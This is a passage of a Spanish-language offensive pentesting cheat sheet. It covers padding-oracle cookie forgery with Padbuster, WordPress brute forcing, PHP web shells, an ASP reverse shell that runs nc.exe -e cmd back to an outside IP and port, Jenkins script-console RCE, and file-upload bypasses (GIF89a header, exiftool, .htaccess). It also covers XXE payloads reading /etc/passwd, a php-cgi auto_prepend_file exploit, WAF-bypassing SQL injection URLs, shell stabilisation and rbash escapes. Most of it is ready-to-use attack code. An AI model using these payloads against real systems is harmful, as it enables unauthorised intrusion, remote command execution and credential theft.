Donde **D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km** es la Cookie de sesiÃ³n y **8** el nÃºmero de bloques. A pesar de no saber la cifra con exactitud, podemos montarnos un simple bucle **for i in $(seq 1 100)** a fin de determinar el nÃºmero de bloques, pues en caso de no ser correcto no se podrÃ¡ aplicar la inyecciÃ³n.

La herramienta tiene cierta similitud al **sqlmap** para inyecciones SQL, sÃ³lo que aquÃ­ las inyecciones las aplica sobre ciertas condiciones de error que son mostradas una vez el nÃºmero de bloques proporcionado es correcto.

Lo que obtendremos una vez todo el proceso se realice correctamente es un Output como el siguiente desde la herramienta:

```bash
[+] Decrypted value (ASCII): user=s4vitar
[+] Decrypted value (HEX): 757365723d733476697461720808080808080808
[+] Decrypted value (Base64): dXNlcj1zNHZpdGFyCg==
```

Con esto entre manos, lo que podemos hacer es generar desde **Padbuster** la Cookie de sesiÃ³n vÃ¡lida para el usuario **admin** en base a la autenticaciÃ³n vÃ¡lida del usuario cuya Cookie hemos capturado.

Para ello, desde **Padbuster** aplicamos la siguiente sintaxis:

```bash
$~ padbuster http://192.168.1.x/login.php D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km 8 --cookies auth=D8GjDDheDK%2F%2B7vMT7B7ceSyl3BuPZ9km --encoding 0 --plaintext user=admin
```

Donde veremos que la herrmamienta directamente nos proporcionarÃ¡ la Cookie de sesiÃ³n para el usuario administrador.

Lo Ãºnico que tenemos que hacer ahora, es desde **Burpsuite**, interceptar una autenticaciÃ³n con nuestro usuario para posteriormente modificar la Cookie a la proporcionada por **PadBuster**. Lo que conseguiremos con esto es acceder como el usuario **admin** al servicio web, burlando el panel de autenticaciÃ³n sin ser necesario conocer la contraseÃ±a de dicho usuario.

#### WordPress

Sobre este gestor de contenidos, la idea es verificar en primer lugar si a travÃ©s del recurso _README.html_ podemos visualizar la versiÃ³n del CMS. De esta forma, posteriormente desde **Searchsploit** podemos buscar vulnerabilidades para dicha versiÃ³n.

En caso de no poder visualizar la versiÃ³n, nos aprovechamos de la herramienta **wpscan** para a travÃ©s de la siguiente sintaxis obtener el versionado del gestor:

```bash
$~ wpscan -u "http://192.168.1.x"
```

En caso de que la web principal del gestor de contenido se encuentre en otra ruta personalizada, por ejemplo **/directorio-wordpress/**, deberemos especificarlo a travÃ©s del parÃ¡metro **--wp-content-dir** para la correcta enumeraciÃ³n desde **wpscan**:

```bash
$~ wpscan -u "http://192.168.1.x" --wp-content-dir "directorio-wordpress"
```

En ocasiones, podremos enumerar los usuarios existentes sobre el gestor, empleando para ello la siguiente sintaxis:

```bash
$~ wpscan -u "http://192.168.1.x" --enumerate u
```

En caso de que el gestor de contenidos cuente con un plugin que bloquee la enumeraciÃ³n de usuarios, podemos hacer uso de la utilidad **stop_user_enumeration_bypass.rb** de _wpscan_ (/usr/share/wpscan/stop_user_enumeration_bypass.rb). La sintaxis serÃ­a la siguiente:

```bash
$~ ruby stop_user_enumeration_bypass.rb http://192.168.1.x
```

Tras obtener usuarios vÃ¡lidos de autenticaciÃ³n, podemos probar a realizar a un ataque de fuerza bruta haciendo uso de la siguiente sintaxis:

```bash
$~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt
```

Una forma de bypassear posibles bloqueos es jugar con el parÃ¡metro **--random-agent**, de la siguiente forma:

```bash
$~ wpscan -u "http://192.168.1.x" --username usuario -w /usr/share/wordlists/rockyou.txt --random-agent
```

La herramienta **wpscan** es capaz de detectar los plugins instalados sobre el gestor, los cuales tambiÃ©n pueden abrir un posible vector de ataque que permita la ejecuciÃ³n de comandos en remoto y variados. Sin embargo, por prevenciÃ³n siempre me gusta fuzzear los plugins haciendo uso del siguiente [recurso](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt) de SecList.

En caso de no obtener o poder enumerar usuarios vÃ¡lidos de autenticaciÃ³n, estos gestores de contenido suelen exponer el usuario propietario de los artÃ­culos o entradas que figuren expuestos sobre la pÃ¡gina principal. De esta forma, podemos llegar a extraer usuarios vÃ¡lidos de autenticaciÃ³n simplemente visualizando quiÃ©n es el autor de las entradas publicadas.

Teniendo un usuario vÃ¡lido de autenticaciÃ³n, a la hora de aplicar la fuerza bruta, antes de lanzar diccionarios tradicionales como el **rockyou.txt**, suelo hacer uso de la herramienta **cewl** para generar mi propio diccionario personalizado en base a la web con la que estoy tratando. Esto se consigue con la siguiente sintaxis:

```bash
cewl -w diccionario http://192.168.1.x
```

AsÃ­ mismo, una vez se logra acceder al gestor de contenidos, la intrusiÃ³n al sistema es la parte mÃ¡s sencilla. Simplemente en la secciÃ³n de Apariencia, en la pestaÃ±a Editor nos vamos al script **404.php** configurado para llevar a cabo una modificaciÃ³n, subiendo nuestro propio cÃ³digo PHP malicioso que permita entablarnos una conexiÃ³n reversa contra el sistema.

Para apuntar a dicho script tenemos 3 vÃ­as:

* http://192.168.1.x/?p=404.php
* http://192.168.1.x/recursoinexistente (Para causar un error que haga que se cargue el script 404.php)
* http://192.168.1.x/404.php

#### PHP Reverse Shell Manual Multifuncional

La mÃ¡s tÃ­pica de las ejecuciones vÃ­a PHP que nos podemos configurar es la siguiente:

```php
<?php
	system('whoami');
?>
```

Pero esto dice mucho de nosotros, vamos a mejorar un poco las cosas. En vez de usar **system**, podemos usar **shell_exec**, mÃ¡s especÃ­fico para la ejecuciÃ³n de comandos vÃ­a shell con retorno del output en formato string.

Esto se resume en la siguiente estructura:

```php
<?php
	echo shell_exec('whoami');
?>
```

En caso de querer ejecutar comandos personalizados desde la URL, podemos definir una estructura como la siguiente:

```php
<?php
	echo shell_exec($_REQUEST['cmd']);
?>
```

De manera que podrÃ­amos elaborar desde la URL la siguiente peticiÃ³n:

`http://192.168.1.X/fichero.php?cmd=whoami`

A la hora de ejecutar ciertos comandos como '_ps -faux_', o un simple '_cat /etc/passwd_', se puede ver como el Output mostrado vÃ­a web en este caso tiene un aspecto poco agradable de leer. Esto lo podemos arreglar aÃ±adiendo unas etiquetas de preformateado en nuestro script:

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

En caso de querer hacerlo **multifuncional**, podemos gestionar la variable proporcionada desde el usuario que hace la peticiÃ³n, donde para el caso presentado a continuaciÃ³n, ademÃ¡s de ejecutar comandos a travÃ©s de la variable '_fexec_', creamos una nueva variable '_fupload_' para la transferencia de archivos desde nuestra mÃ¡quina local a la mÃ¡quina remota en el directorio de trabajo:

```php
<?php
	if(isset($_REQUEST['fexec'])){
		echo "<pre>" . shell_exec($_REQUEST['fexec']) . "</pre>";
	};
	
	if(isset($_REQUEST['fupload'])){
		file_put_contents($_REQUEST['fupload'], file_get_contents("http://127.0.0.1:8000/" . $_REQUEST['fupload']));
	};
?>
```

De esta forma, el usuario que hace las consultas podrÃ­a efectuar cualquiera de las siguientes 3 operaciones:

* http://192.168.1.X/fichero.php?fexec=whoami
* http://192.168.1.X/fichero.php?fupload=script.php 
* http://192.168.1.X/fichero.php?upload=script.php&fexec=php+script.php

Para depositar archivos sobre el sistema aprovechando la variable '_fupload_', necesitaremos compartir un servidor con Python perviamente sobre el directorio cuyos recursos queramos depositar sobre el equipo remoto.

#### ASP ASPX Reverse Shell

Habiendo citado ya una forma de entablar una conexiÃ³n TCP reversa a travÃ©s de un fichero .asp/.aspx generado desde Metasploit, otra vÃ­a en caso de que la primera no funcione, es crear un archivo con dicho contenido:

```bash
<%
Dim oS
On Error Resume Next
Set oS = Server.CreateObject("WSCRIPT.SHELL")
Call oS.Run("C:\Inetpub\nc.exe -e cmd 10.11.0.173 1122",0,True)
%>
```

Habiendo previamente subido el binario **nc.exe**, con esto conseguiremos que de ser interpretado vÃ­a web el script, se nos entable una reverse shell por el puerto 1122 vÃ­a Netcat gracias a la ejecuciÃ³n del binario previamente alojado.

#### x-jenkins

En caso de que el servicio web corra un **Jenkins**, de manera inmediata se comprobarÃ¡ si existe el recurso **/script/** sobre el servicio. En caso de existir, el servicio es vulnerable a ejecuciÃ³n remota de comandos gracias al script de consultas interactivas que podemos crear desde ahÃ­.

Para ello, deberemos definir las siguientes lÃ­neas de consulta:

```bash
cmd = "whoami"
cmd.execute().text
```

Tras enviar la consulta, veremos el Output de la ejecuciÃ³n a nivel de sistema del comando proporcionado.

#### Bypass File Upload Filtering

Una de las tÃ©cnicas tÃ­picas ademÃ¡s del **Null Byte Injection** y las de **Content-Type**, es la de doble extensiÃ³n. Esto es simplemente renombrar nuestro script php a _shell.php.jpg_. 

Listo a continuaciÃ³n otros formatos aceptados en funciÃ³n del lenguaje que se utilice:

**php** phtml, .php, .php3, .php4, .php5, and .inc
**asp** asp, .aspx
**perl** .pl, .pm, .cgi, .lib
**jsp** .jsp, .jspx, .jsw, .jsv, and .jspf
**Coldfusion** .cfm, .cfml, .cfc, .dbm

En caso de analizar el **Content** en la subida de archivo, podemos bypassearla de la siguiente forma:

```bash
GIF89a;
<?
system($_GET['cmd']);
?>
```

Otra vÃ­a alternativa es a travÃ©s de imÃ¡genes, haciendo uso de **exiftool** para insertar metadatos. Para ello, sobre una imagen vÃ¡lida, aplicamos el siguiente comando:

```bash
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' imagen.jpg
```

Posteriormente, es necesario renombar el archivo **imagen.jpg** a **imagen.php.jpg**. Una vez hecho, tras subir la imagen, podremos apuntar a ella jugando con la variable **cmd** posteriormente para ejecutar comandos en remoto sobre el sistema desde la URL.

Otra tÃ©cnica bastante chula, consiste en subir un archivo **.htaccess**. En caso de existir en el directorio de subida, la idea es poder sobreescribir su contenido. En caso de no existir, es simplemente rezar y esperar que no exista otro en un directorio padre.

Nuestro archivo **.htaccess**, tendrÃ­a el siguiente contenido:

```bash
Add-Type Application/x-httpd-php .miextension
```

De subirlo y alojarlo en el servidor, posteriormente si subimos un archivo de extensiÃ³n **.miextension**, serÃ¡ interpretado como un archivo PHP.

#### XML External Entity Injection

Para practicar podemos jugar con las mÃ¡quinas **Aragog** y **DevOops** de **HackTheBox**. Antes que nada quiero citar que es necesario conocer la estructura XML que hay por detrÃ¡s a la hora de interpretar el content, me explico. Supongamos que tras subir un archivo XML, la web nos muestra el siguiente Output:

```bash
User: s4vitar
Password: myPassword
```

Esto ha sido asÃ­ dado que previamente de alguna forma se nos ha avisado de que las sub-etiquetas a definir en nuestro archivo XML son **User** y **Password**, asÃ­ como una etiqueta principal **creds** que englobe a estas. Esto nos permite llevar a cabo un ataque como el que describirÃ© a continuaciÃ³n. 

En un principio, estarÃ­amos enviando el siguiente archivo XML:

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
    <creds>
       <User>s4vitar</user>
       <Pass>myPassword</pass>
    </creds>
```

Conociendo por tanto la estructura, podrÃ­amos decidir enviar un contenido como el siguiente:

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "expect://id" >]>
    <creds>
       <User>&xxe;</user>
       <Pass>myPassword</pass>
    </creds>
```

A la hora de listar el Output desde la web, nos encontrarÃ­amos con el siguiente resultado:

```bash
User: www-data
Password: myPassword
```

Esto ha sido asÃ­ dado que estamos jugando con el _wrapper_ **expect**. Hay casos en los que puede que no se logre ejecutar comandos en el sistema, en tal caso podrÃ­amos probar a leer archivos de la siguiente forma:

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE foo [ <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <creds>
       <User>&xxe;</user>
       <Pass>myPassword</pass>
    </creds>
```

Donde tal y como se podrÃ¡ predecir, en el campo **User** se listarÃ¡ el contenido del fichero **/etc/passwd**. Una idea aquÃ­ es visualizar si para algunas de los usuarios existentes en base a la visualizaciÃ³n del recurso anteriormente visto, bajo el directorio **.ssh** podemos encontrarnos con una clave privada de acceso por SSH para usarla como fichero de identificaciÃ³n, de esta forma... lograrÃ­amos acceder al sistema sin proporcionar contraseÃ±a alguna.

Otro ejemplo prÃ¡ctico asÃ­ como modo de hacer el mismo procedimiento es el siguiente. Supongamos un servicio Apache, esta vez no tenemos la posibilidad de subir archivos, sin embargo contamos por detrÃ¡s con la siguiente estructura:

```bash
<?php 
    libxml_disable_entity_loader (false); 
    $xmlfile = file_get_contents('php://input'); 
    $dom = new DOMDocument(); 
    $dom->loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); 
    $creds = simplexml_import_dom($dom); 
    $user = $creds->user; 
    $pass = $creds->pass; 
    echo "You have logged in as user $user";
?> 
```

Como es de obviar, se nos pide una estructura XML como la siguiente:

```bash
<creds>
    <user>Ed</user>
    <pass>mypass</pass>
</creds>
```

En este caso varÃ­a un poco la peticiÃ³n, pero podemos hacerla desde terminal:

```bash
$~ curl -d @xml.txt http://localhost/xml_injectable.php 
```

El concepto al fin y al cabo es el mismo, el servidor responde lo siguiente:

```bash
You have logged in as user Ed
```

Y a raÃ­z de esto, podemos elaborar una estructura XML maliciosa como la siguiente:

```bash
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

Â¿QuÃ© conseguimos con esto?, obtener lo siguiente:

```bash
$~ curl -d @xml.txt http://localhost/xml_injectable.php 

You have logged in as user root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
```

#### PHP CGI Exploitation

A continuaciÃ³n, se detalla una vulnerabilidad presente en algunos **php-cgi** desactualizados, los cuales nos permiten entre otras cosas lograr la ejecuciÃ³n remota de comandos.

La pregunta a hacerse es, Â¿cÃ³mo comprobamos si en caso de que exista, posee una versiÃ³n vulnerable?. Dado que uno de los parÃ¡metros con los que cuenta el binario es el **-s**, el cual nos permite ver el Source de aquello que le pasemos, una de las trazas que suelo hacer para corroborar si es o no es vulnerable es hacer una consulta sobre el recurso **/?-s**.

Si lo que vemos es el cÃ³digo fuente en vez del contenido de la pÃ¡gina en formato legible, esto quiere decir, en pocas palabras, que es probable que podamos hacer **RCE** (Remote Code Execution). Recapitulando, hemos sido capaces de ver el Source de la propia web a travÃ©s del parÃ¡metro pasado, pero no sirve de mucho si lo que pretendemos hacer es dar un enfoque intrusivo a la mÃ¡quina que sustenta este servidor web.

Sin embargo, existe otro parÃ¡metro interesante del php-cgi del cual nos podemos aprovechar, el parÃ¡metro **-d**. Este parÃ¡metro nos permite definir las entradas **INI** de la configuraciÃ³n de archivos. Algo a tener en cuenta, en caso de pretender lograr ejecuciÃ³n remota de cÃ³digo, es tratar de enviar cÃ³digo PHP al servidor y que sea capaz de interpretarlo. 

Para ello, lo que hacemos es utilizar el _wrapper_ **php://input**, con el fin de incrustar el cÃ³digo definido en el cuerpo de la solicitud.

Necesitamos 2 cosas para ello, por un lado, necesitamos que se lea el cÃ³digo php de nuestra solicitud. Lo que buscamos es una opciÃ³n PHP que diga al propio PHP que lea de un archivo y lo apunte a **php://input**. Afortunadamente, PHP cuenta con la opciÃ³n **auto_prepend_file** desde la versiÃ³n 4.2.3. Lo bueno de esta opciÃ³n, es que el contenido del archivo se incluye antes que cualquier otro archivo, o en otras palabras, se incluye antes de ejecutar cualquier otro cÃ³digo, por lo que garantizamos que ningÃºn otro cÃ³digo afecte a nuestra explotaciÃ³n.

Por otro lado, si queremos usar **php://input**, debemos permitir que la url lo incluya, pero esto no supone ningÃºn problema, dado que podemos redefinir las entradas INI. Esto puede activarse fÃ¡cilmente usando **-d allow_url_include=1**.

Suponiendo que quisiÃ©ramos ejecutar en remoto el comando _whoami_, lo que hacemos es montarnos un simple script PHP de antemano el cual enviamos posteriormente vÃ­a POST a la web con todo lo que hemos comentado. De la siguiente forma:

```bash
$~ echo "<?php system('whoami');die(); ?>" | POST "http://192.168.1.X/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input"

www-data
```

Para entablar una reverse shell, ya simplemente dependerÃ¡ de la metodologÃ­a que una quiera emplear.

#### Waf Bypassing

##### WAF SQL Injection Bypass WAF Techniques

**1. Null Bytes**

Para elaborar una inyecciÃ³n **Null Byte**:

```bash
http://example.com/news.php?id=1+%00â€™union+select+1,2,3â€²â€“
```

**2. Consultas a travÃ©s de SQL Comments**

```bash
http://example.com/news.php?id=1+un/**/ion+se/**/lect+1,2,3â€“
```

**3. URL Encoding**

```bash
http://example.com/news.php?id=-1 /*!u%6eion*/ /*!se%6cect*/ 1,2,3,4â€”
```

**4. Encode to Hex Forbidden**

```bash
http://example.com/news.php?id=-1/%2A%2A/union/%2A%2A/select/%2A%2A/1,2,3,4,5 â€“+-

http://example.com/news.php?id=-1%2F%2Funion%2F%2Fselect%2F**%2F1,2,3,4,5 â€“+-
```

**5. Case Changing**

```bash
http://example.com/news.php?id=-1+UnIoN//SeLecT//1,2,3â€“+-
```

**6. Replaced Keywords**

```bash
http://example.com/news.php?id=-1+UNunionION+SEselectLECT+1,2,3â€“+
```

**7. WAF Bypassing - using characters**

```bash
http://example.com/news.php?id=-1+uni*on+sel*ect+1,2,3,4â€“+-
```

**8. CRLF WAF Bypass Technique**

```bash
http://example.com/news.php?id=-1+%0A%0Dunion%0A%0D+%0A%0Dselect%0A%0D+1,2,3,4,5 â€”
```

**9. HTTP Parameter Pollution (PHP)**

```bash
http://example.com/news.php?id=1;select+1&id=2,3+from+users+where+id=1â€“


http://example.com/news.php?id=-1/* &id= */union/* &id= */select/* &id= */1,2 â€”
```


### Pentesting Linux

#### Tratamiento de la TTY

Una vez accedemos a un equipo Linux con una reverse shell de Netcat, veremos que andamos a ciegas, lo que hace que incluso no podamos utilizar servicios que corran en interactivo (Python, mysql, etc.). Para arreglar este problema, simplemente seguimos los pasos que se describen a continuaciÃ³n.

* Cargamos una pseudoconsola sobre el sistema

Tenemos 2 formas de hacer esto, la primera es la siguiente:

```bash
script /dev/null -c bash
```

Otra de ellas es a travÃ©s de python, para ello se recomienda aplicar un `whereis python` a nivel de sistema para comprobar las versiones que se encuentran presentes en el sistema, asÃ­ tendremos que aplicar el siguiente comando seguido de su versiÃ³n:

```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```

* Configuramos las variables de entorno correctamente

A continuaciÃ³n presionamos la tecla **Ctrl+Z**, esto lo que harÃ¡ serÃ¡ dejar en segundo plano nuestra sesiÃ³n (no hay que asustarse). Una vez hecho, aplicamos los siguientes comandos:

```bash
stty raw -echo
fg
reset
xterm
```

Tras introducir el primero, es normal que al escribir **fg** no veamos lo que se estÃ¡ escribiendo, sin embargo se estÃ¡n introduciendo los caracteres. Este comando lo que harÃ¡ serÃ¡ retornanos a la sesiÃ³n que tenÃ­amos vÃ­a **Netcat**. Con el comando **reset** reconfiguraremos nuestra sesiÃ³n, preguntÃ¡ndonos en la mayorÃ­a de los casos a continuaciÃ³n con quÃ© tipo de terminal queremos tratar.

Puede ser que no nos pregunte por el tipo de terminal, en caso de que sÃ­ lo haga, introducimos `xterm`, en caso de que no e incluso aunque lo pida, posteriormente aplicamos los siguientes comandos:

```bash
export TERM=xterm
export SHELL=bash
```

Una vez hecho, lo Ãºnico que queda (paso opcional), es configurar correctamente el redimensionamiento de la terminal, pues en caso de abrir algÃºn editor como nano, veremos que las proporciones no cuadran. Para ello, lo mÃ¡s recomendable es poner a tamaÃ±o completo la terminal.

Abrimos otra terminal en nuestro sistema con el mismo redimensionamiento, y aplicamos el siguiente comando:

```bash
â”Œâ”€[root@parrot]â”€[/home/s4vitar/Desktop]
â””â”€â”€â•¼ #stty -a
speed 38400 baud; rows 44; columns 190; line = 0;
intr = ^C; quit = ^\; erase = ^?; kill = ^U; eof = ^D; eol = <undef>; eol2 = <undef>; swtch = <undef>; start = ^Q; stop = ^S; susp = ^Z; rprnt = ^R; werase = ^W; lnext = ^V; discard = ^O;
min = 1; time = 0;
-parenb -parodd -cmspar cs8 -hupcl -cstopb cread -clocal -crtscts
-ignbrk -brkint -ignpar -parmrk -inpck -istrip -inlcr -igncr icrnl ixon -ixoff -iuclc -ixany -imaxbel iutf8
opost -olcuc -ocrnl onlcr -onocr -onlret -ofill -ofdel nl0 cr0 tab0 bs0 vt0 ff0
isig icanon iexten echo echoe echok -echonl -noflsh -xcase -tostop -echoprt echoctl echoke -flusho -extproc

```

Tal y como podemos ver, figuran los nÃºmeros de filas y columnas, 44 y 190 respectivamente para este caso. Copiamos dicha configuraciÃ³n en la mÃ¡quina que hemos comprometido donde se ha llevado a cabo toda la previa configuraciÃ³n, aplicando para ello el siguiente comandos:

```bash
stty rows 44 columns 190
```

El resultado final serÃ¡ una Shell completamente interactiva, donde nos sentiremos como si hubiÃ©ramos ganado acceso por SSH, con capacidad de tabulaciÃ³n, uso de Shortcuts (Ctrl+C, Ctrl+L, etc.), sesiones interactivas, etc.


#### Process Monitoring

A la hora de escalar privilegios, es una buena idea montarse un script **procmon.sh** para la monitorizaciÃ³n de procesos y comandos aplicados a nivel de sistema en tiempo real.

Para ello, tan sÃ³lo tendremos que crear un script sobre el sistema como el siguiente:

```bash
#!/bin/bash

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep "[\>\<]" | grep -v "procmon.sh" | grep -v "command"
	old_process=$new_process
done
```

Tras su ejecuciÃ³n, tendremos una visual de toods los comandos que se estÃ¡n aplicando a nivel de sistema, incluidos los llevados a cabo por el usuario root del equipo, incluyendo rutas y subprocesos.

#### Escaping Restricted Shell

Con el objetivo de preparar un escenario realista, presentarÃ© 2 casos, partiendo de una escapada convencional a otra un poco mÃ¡s rebuscada. TambiÃ©n hay que decir que todo dependerÃ¡ del nivel de restricciÃ³n que el administrador haya implementado sobre el usuario.

Para el primer caso, seguimos los siguientes pasos para preparar nuestro escenario de usuario:

```bash
â”Œâ”€[root@parrot]â”€[/home]
â””â”€â”€â•¼ #mkdir testuser
â”Œâ”€[root@parrot]â”€[/home]
â””â”€â”€â•¼ #useradd testuser -d /home/testuser -s /bin/rbash
â”Œâ”€[root@parrot]â”€[/home]
â””â”€â”€â•¼ #passwd testuser
Introduzca la nueva contraseÃ±a de UNIX: 
Vuelva a escribir la nueva contraseÃ±a de UNIX: 
passwd: contraseÃ±a actualizada correctamente
â”Œâ”€[root@parrot]â”€[/home]
â””â”€â”€â•¼ #chown testuser:testuser /home/testuser
```

En este caso, la contraseÃ±a asignada ha sido **test123**. Como vemos, se ha asignado una shell restrictiva al usuario **testuser**, esto lo podemos comprobar a travÃ©s de la variable **export**:

```bash
testuser@parrot:~$ export
declare -x DBUS_SESSION_BUS_ADDRESS="unix:path=/run/user/1002/bus"
declare -x HOME="/home/testuser"
declare -x LANG="es_ES.UTF-8"
declare -x LOGNAME="testuser"
declare -x MAIL="/var/mail/testuser"
declare -x OLDPWD
declare -rx PATH="/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/snap/bin"
declare -x PWD="/home/testuser"
declare -rx SHELL="/bin/rbash"
declare -x SHLVL="1"
declare -x SSH_CLIENT="::1 48084 22"
declare -x SSH_CONNECTION="::1 48084 ::1 22"
declare -x SSH_TTY="/dev/pts/1"
declare -x TERM="xterm"
declare -x USER="testuser"
declare -x XDG_DATA_DIRS="/usr/local/share:/usr/share:/var/lib/snapd/desktop"
declare -x XDG_RUNTIME_DIR="/run/user/1002"
declare -x XDG_SESSION_ID="80"
testuser@parrot:~$ 
```

Tal y como vemos en la variable **SHELL**, tenemos la _restricted bash_. Si un administrador de sistemas asigna esta shell a un usuario, en un principio se toparÃ­a con estos inconvenientes:

```bash
testuser@parrot:~$ pwd
/home/testuser
testuser@parrot:~$ cd
-rbash: cd: restringido
testuser@parrot:~$ cd ..
-rbash: cd: restringido
testuser@parrot:~$ cd /
-rbash: cd: restringido
testuser@parrot:~$ echo prueba > fichero.txt
-rbash: fichero.txt: restringido: no se puede redirigir la salida
testuser@parrot:~$ touch fichero
testuser@parrot:~$ mkdir directorio
testuser@parrot:~$ ls -l
total 4
drwxr-xr-x 2 testuser testuser 4096 nov 11 23:52 directorio
-rw-r--r-- 1 testuser testuser    0 nov 11 23:52 fichero
```

Existen ciertos inconvenientes en cuanto a movilidad respecta, aunque sÃ­ que es cierto que en cuanto a visualizaciÃ³n, podemos visualizar cualquier recurso del sistema sin mayor inconveniente. Un administrador de sistemas poco experimentado, podrÃ­a no tener en cuenta lo siguiente:

```bash
testuser@parrot:~$ echo $SHELL
/bin/rbash
testuser@parrot:~$ cd ..
-rbash: cd: restringido
testuser@parrot:~$ bash
testuser@parrot:~$ pwd
/home/testuser
testuser@parrot:~$ cd ..
testuser@parrot:/home$ ls
s4vitar  testuser
testuser@parrot:/home$ cd /
testuser@parrot:/$ pwd
/
testuser@parrot:/$ 
```

Con la misma, el usuario se ha escapado a una **bash**, teniendo mayor movilidad sobre el sistema. Es por ello que como buena medida, ademÃ¡s de asignar dicha Shell se haga algo como esto:

```bash
â”Œâ”€[root@parrot]â”€[/home/testuser]
â””â”€â”€â•¼ #pwd
/home/testuser
â”Œâ”€[root@parrot]â”€[/home/testuser]
â””â”€â”€â•¼ #mkdir bin
â”Œâ”€[root@parrot]â”€[/home/testuser]
â””â”€â”€â•¼ #cd !$
cd bin
â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
â””â”€â”€â•¼ #cp /bin/ping .
â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
â””â”€â”€â•¼ #cp /usr/bin/tee .
â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
â””â”€â”€â•¼ #cp /bin/ls .
â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
â””â”€â”€â•¼ #ls
ls  ping  tee
â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
â””â”€â”€â•¼ #chmod o+w ping
â”Œâ”€[root@parrot]â”€[/home/testuser/bin]
â””â”€â”€â•¼ #cd ..
â”Œâ”€[root@parrot]â”€[/home/testuser]
â””â”€â”€â•¼ #echo -e "PATH=/home/testuser/bin\nexport PATH" > .bashrc
â”Œâ”€[root@parrot]â”€[/home/testuser]
â””â”€â”€â•¼ #cat .bashrc
PATH=/home/testuser/bin
export PATH
```

Como vemos en este caso el administrador de sistemas ha decidido que sÃ³lo pueda ejecutar esos 3 comandos (**ls ping tee**). 

Este caso es a modo de ejemplo, y la asignaciÃ³n de permisos de escritura por parte de otros al binario **ping** se ha hecho a posta para que se vea cÃ³mo por esta simple tonterÃ­a un usuario podrÃ­a escapar de la restricted bash.

Veamos cÃ³mo serÃ­a la movilidad a nivel de usuario:

```bash
testuser@parrot:~$ echo $PATH
/home/testuser/bin
testuser@parrot:~$ ls
bin
testuser@parrot:~$ cat .bashrc
rbash: cat: no se encontrÃ³ la orden
testuser@parrot:~$ cat /etc/passwd
rbash: cat: no se encontrÃ³ la orden
testuser@parrot:~$ cd ..
rbash: cd: restringido
testuser@parrot:~$ cd /
rbash: cd: restringido
testuser@parrot:~$ touch archivo
rbash: touch: no se encontrÃ³ la orden
testuser@parrot:~$ mkdir directorio
rbash: mkdir: no se encontrÃ³ la orden
testuser@parrot:~$ ls bin
ls  ping  tee
testuser@parrot:~$ ping -c 1 localhost
ping: socket: OperaciÃ³n no permitida
testuser@parrot:~$ ping localhost
ping: socket: OperaciÃ³n no permitida
testuser@parrot:~$ 
```

El usuario estÃ¡ mucho mÃ¡s limitado, pues sus binarios se encuentran bajo el directorio /bin de su home y sÃ³lo puede ejecutar 3 comandos muy bÃ¡sicos. Como vemos, el usuario **testuser** no puede visualizar el recurso **.bashrc**, donde estÃ¡ definido su PATH. Esto es asÃ­ debido a que no puede ejecutar el comando **cat**.

Sin embargo, aprovechando el permiso que el administrador del sistema asignÃ³ al binario **ping**, el usuario puede hacer lo siguiente para visualizar el recurso a modo de ejemplo:

```bash
testuser@parrot:~$ ls -l bin
total 240
-rwxr-xr-x 1 root root 138856 nov 11 23:59 ls
-rwxr-xrwx 1 root root  65272 nov 11 23:56 ping
-rwxr-xr-x 1 root root  39648 nov 11 23:57 tee
testuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping
#!/bin/bash
testuser@parrot:~$ echo '/bin/cat /home/testuser/.bashrc' | tee -a bin/ping
/bin/cat /home/testuser/.bashrc
testuser@parrot:~$ ping
PATH=/home/testuser/bin
export PATH
testuser@parrot:~$ 
```

Dado que algo tÃ­pico en el **rbash** es el no poder utilizar los operadores **> / >>** para redirigir la salida de comandos, el usuario se puede aprovechar de la utilidad de **rbash** para depositar contenido sobre su directorio personal, asÃ­ como sobre el recurso **ping** situado en el directorio **bin/**. 

De esta forma, dado que la variable **PATH** figura sobre dicho directorio, puede hacer que el binario **ping** tome una nueva funcionalidad, donde como vemos, se aprovecha de la misma para visualizar el recurso **.bashrc**. Una vez ve que el problema radica en dicho recurso, puede aplicar el siguiente movimiento lateral:

```bash
testuser@parrot:~$ echo '#!/bin/bash' | tee bin/ping
#!/bin/bash
